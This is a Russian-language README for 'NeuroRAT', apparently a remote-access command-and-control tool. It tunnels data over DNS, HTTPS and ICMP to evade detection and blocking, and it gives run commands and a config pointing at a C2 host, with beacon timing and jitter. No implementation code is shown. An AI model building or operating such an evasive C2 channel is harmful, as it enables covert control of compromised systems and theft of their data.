# NeuroRAT

NeuroRAT - это продвинутая платформа для скрытой коммуникации, использующая различные каналы связи для обхода традиционных средств обнаружения и блокировки.

## Особенности

- **Множественные каналы связи**:
  - DNS-туннелирование - передача данных через DNS-запросы
  - HTTPS-туннелирование - имитация обычного веб-трафика
  - ICMP-туннелирование - обмен данными через ping-запросы
  
- **Устойчивость и адаптивность**:
  - Автоматическое переключение между каналами при обнаружении блокировки
  - Динамическая адаптация к сетевым условиям
  - Механизмы восстановления соединения

- **Безопасность**:
  - Шифрование данных (AES-256-GCM, ChaCha20-Poly1305)
  - Защита целостности данных
  - Обфускация трафика

- **Гибкая конфигурация**:
  - Настройка через JSON-файлы или командную строку
  - Возможность удаленного обновления конфигурации
  - Подробное логирование

## Архитектура

Проект состоит из нескольких ключевых компонентов:

1. **Channel Manager** - координирует работу различных каналов связи
2. **Модули туннелирования** - реализуют конкретные протоколы для скрытой передачи данных
3. **Crypto Module** - обеспечивает криптографическую защиту данных
4. **Main Module** - основной модуль, управляющий всей системой

```
src/
├── __init__.py
├── main.py             # Основной модуль
├── channel_manager.py  # Менеджер каналов связи
├── modules/
│   ├── __init__.py
│   ├── crypto.py       # Криптографический модуль
│   ├── dns_tunnel.py   # DNS туннелирование
│   ├── https_tunnel.py # HTTPS туннелирование
│   └── icmp_tunnel.py  # ICMP туннелирование
```

## Установка

### Требования

- Python 3.6 или выше
- Библиотека cryptography для шифрования
- Права администратора для ICMP-туннелирования

### Установка зависимостей

```bash
pip install cryptography
```

## Использование

### Запуск с базовыми параметрами

```bash
python src/main.py --c2-host example.com --primary-channel https
```

### Использование конфигурационного файла

```bash
python src/main.py -c config.json
```

### Пример конфигурационного файла

```json
{
  "c2_host": "example.com",
  "c2_ip": "192.168.1.1",
  "primary_channel": "https",
  "encryption_method": "aes",
  "channels": {
    "dns": {
      "query_interval": 1.5,
      "jitter": 0.3,
      "max_chunk_size": 30
    },
    "https": {
      "port": 443,
      "poll_interval": 5.0,
      "jitter": 0.3,
      "max_chunk_size": 1024,
      "paths": ["/", "/news", "/api"]
    },
    "icmp": {
      "poll_interval": 2.0,
      "jitter": 0.2,
      "max_chunk_size": 32
    }
  }
}
```

### Параметры командной строки

- `-c, --config` - путь к файлу конфигурации
- `--log-level` - уровень логирования (DEBUG, INFO, WARNING, ERROR)
- `--log-file` - файл для записи логов
- `--c2-host` - хост C2-сервера
- `--c2-ip` - IP-адрес C2-сервера (для ICMP)
- `--primary-channel` - основной канал связи (dns, https, icmp)
- `--encryption-method` - метод шифрования (aes, chacha20, xor)
- `--encryption-key` - ключ шифрования в формате base64

## Примечания по безопасности

- ICMP-туннелирование требует прав администратора (root)
- В производственной среде рекомендуется использовать сильные методы шифрования (AES, ChaCha20)
- XOR-шифрование следует использовать только в тестовых целях

## Расширение функциональности

Проект спроектирован модульно и легко расширяется. Для добавления нового канала связи:

1. Создайте новый модуль в директории `modules/`
2. Реализуйте в нем интерфейс, аналогичный существующим туннелям
3. Добавьте поддержку нового канала в `channel_manager.py`

## TODO

- Добавить поддержку SMB-туннелирования
- Реализовать сжатие данных перед шифрованием
- Добавить поддержку прокси-серверов для HTTPS-канала
- Улучшить механизмы обнаружения блокировки каналов
- Добавить поддержку IPv6

## Дисклеймер

Этот проект создан исключительно в исследовательских и образовательных целях. Использование данного ПО должно соответствовать законодательству вашей страны. Авторы не несут ответственности за любое неправомерное использование данного программного обеспечения. 